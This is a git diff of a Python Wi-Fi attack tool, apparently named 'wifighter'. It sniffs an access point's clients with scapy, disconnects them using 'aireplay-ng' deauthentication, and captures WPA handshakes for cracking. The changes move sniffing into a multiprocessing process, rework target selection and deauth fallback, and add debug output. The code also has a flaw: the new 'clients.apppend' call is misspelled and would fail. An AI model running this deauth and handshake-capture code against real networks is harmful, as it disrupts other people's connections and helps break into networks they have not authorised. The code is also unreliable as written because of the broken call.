@@ -3,7 +3,7 @@
 # | IMPORT | #
 
 import os, sys, subprocess, time, re, multiprocessing
-from multiprocessing import Process, Pipe
+from multiprocessing import Process, Pipe, Manager
 from prettytable import PrettyTable 
 import psutil
 from scapy.all import *
@@ -177,6 +177,8 @@ def monitor_switch(verbose, command, interface, channel):
                os.system(f'iw dev {interface} set type monitor 2>&1')
                os.system(f'ip link set {interface} up 2>&1')
                if channel: 
+                    if verbose:
+                         print(f"{CYAN}Setting {interface} to channel {channel}...{RESET}")
                     os.system(f'iw dev {interface} set channel {channel} 2>&1') # Listen specific channel if provided
           elif command == "start":
                if verbose:
@@ -549,37 +551,45 @@ def list_ap(wifi_networks):
 # | Handshake Crack | #
 
 def sniff_clients(interface, target_ap):
-     # Standardized MAC addresses in networking (communication with .startswith(these) won't appear as a result of the sniffing)
      standardized_MACs = ['ff:ff:ff:ff:ff:ff', '01:80:c2:00:00:00', '01:80:c2:00:00:0e', '01:00:5e', '33:33']
-     interrupted = False
+     interrupted = multiprocessing.Value('b', False)
 
-     clients = set()
+     # Set shared list so multiprocess processes can append into it
+     manager = Manager()
+     clients = manager.list()
      def packet_handler(pkt):
-        if pkt.haslayer(Dot11):
-            # Check if the packet is a data frame
-            if pkt.type == 2: 
-               if pkt.addr2 == target_ap and pkt.addr1 not in clients: 
-                    # Check if not one of the standardized MAC addresses
-                    if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs): 
-                         #print(f'2 {pkt.addr2} = {target_ap}, | {pkt.addr1} |')
-                         #client = f'{pkt.addr2} -> {pkt.addr1}' # AP MAC -> Client MAC
-                         clients.add(pkt.addr1)
+          if pkt.haslayer(Dot11):
+               # Check if the packet is a data frame
+               if pkt.type == 2: 
+                    if pkt.addr2 == target_ap and pkt.addr1 not in clients: 
+                         # Check if not one of the standardized MAC addresses
+                         if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs): 
+                              #print(f'2 {pkt.addr2} = {target_ap}, | {pkt.addr1} |')
+                              clients.apppend(pkt.addr1)
 
-               elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
-                    # Check if not one of the standardized MAC addresses
-                    if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs):
-                         #print(f'1 {pkt.addr1} = {target_ap}, | {pkt.addr2} |')
-                         #client = f'{pkt.addr1} -> {pkt.addr2}' # AP MAC -> Client MAC
-                         clients.add(pkt.addr2)
-     #print('Start sniffing')
+                    elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
+                         # Check if not one of the standardized MAC addresses
+                         if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs):
+                              #print(f'1 {pkt.addr1} = {target_ap}, | {pkt.addr2} |')
+                              clients.append(pkt.addr2)
+
+     def sniffing_process(interrupted):
+          try:
+               sniff(iface=interface, prn=packet_handler, timeout=8)
+          except KeyboardInterrupt:
+               interrupted.value = True
+
+     process = multiprocessing.Process(target=sniffing_process, args=(interrupted,))
+     process.start()
      try:
-          sniff(iface=interface, prn=packet_handler, timeout=8)  # Start sniffing on the specified interface
+          while process.is_alive():
+               time.sleep(1)
      except KeyboardInterrupt:
-          print('Keyboard interrupt in sniff caught!')
-          interrupted = True
-     #print('Stop sniffing')
-     #print(f'Sniff: interrupted {interrupted}')
-     return list(clients), interrupted
+          interrupted.value = True
+          process.terminate()
+          process.join()
+
+     return list(clients), interrupted.value
 def list_clients(sniffed_clients, ssid, bssid):
      # Create AP table
      table = PrettyTable()
@@ -629,27 +639,27 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      if deauth_mode == 'client deauth':
           logo()
           print(f"Sniffing for {target}'s clients...")
-          try:
-               while True:
-                    # Get available AP's
-                    sniffed_clients, interrupted = sniff_clients(interface, bssid) # Get output array from iw
-                    #print(f'Func: interrupted {interrupted}')
-                    if interrupted:
-                         break
-                    #print(sniffed_clients)
-                    logo()
-                    list_clients(sniffed_clients, ssid, bssid) # Show available clients's in table
 
-                    time.sleep(3) # Time for user to end the scan
-          except KeyboardInterrupt:
-               print(f'choose from {sniffed_clients}')
-               if sniffed_clients:
-                    try:
-                         # Let user choose client as target
-                         target_client = choose_target_client(sniffed_clients)
-                    except:
-                         pass
+          while True:
+               # Get available AP's
+               sniffed_clients, interrupted = sniff_clients(interface, bssid) # Get output array from iw
+               # Show the sniff results periodically
+               logo()
+               list_clients(sniffed_clients, ssid, bssid) # Show available clients's in table
+               # Break the while cycle when Keyboardinterrupt is caught in the sniff function
+               if interrupted:
+                    break
 
+          # Let user choose client as target
+          if sniffed_clients:
+               try:
+                    target_client = choose_target_client(sniffed_clients)
+               except:
+                    pass
+          # Switch to silent deauth mode when target AP was not set
+          if not target_client:
+               print(f'{YELLOW}No target client set!\n{RESET}')
+               deauth_mode = 'silent'
 
      # Define output dir for handshakes
      output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"
@@ -695,8 +705,6 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                               print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                          except:
                               pass
-                    else:
-                         print(f'{YELLOW}No target client set!\n{RESET}')
                elif deauth_mode == "broadcast":
                     try:
                          command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
@@ -741,6 +749,9 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
      output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
+     
+     print(deauth_mode)
+     time.sleep(3)
 
      # Wait and verify that handshake was captured successfuly
      captured = False
@@ -912,20 +923,24 @@ else:
                          list_ap(wifi_networks) # Show available AP's in table
                     time.sleep(1) # Wait before each scan
           except KeyboardInterrupt:
-               if wifi_networks and target_ap['BSSID'] and target_ap['Channel']:
+               if wifi_networks:
                     target_ap = choose_target() # Let user choose AP as target
                else:
-                    print(f"\n\n{RED}No AP's found or the selected one is missing mandatory parameters!{RESET}")
+                    print(f"\n\n{RED}No AP's found!{RESET}")
 
      # List attack possibilities
      if target_ap:
-          logo()
-          attack = choose_attack(target_ap)
+          if target_ap['BSSID'] and target_ap['Channel']:
+               logo()
+               attack = choose_attack(target_ap)
+          else:
+               print(f"\n\n{RED}Selected AP is missing mandatory parameters!{RESET}")
      
      # Run attacks
      if attack:
           monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-          stop_services('verbose') # Make sure interfering services are not running
+          #stop_services('verbose') # Make sure interfering services are not running
+          time.sleep(3)
           target = target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID'] # Set target by checking if SSID set
           logo()
           if attack == 'Handshake Crack':
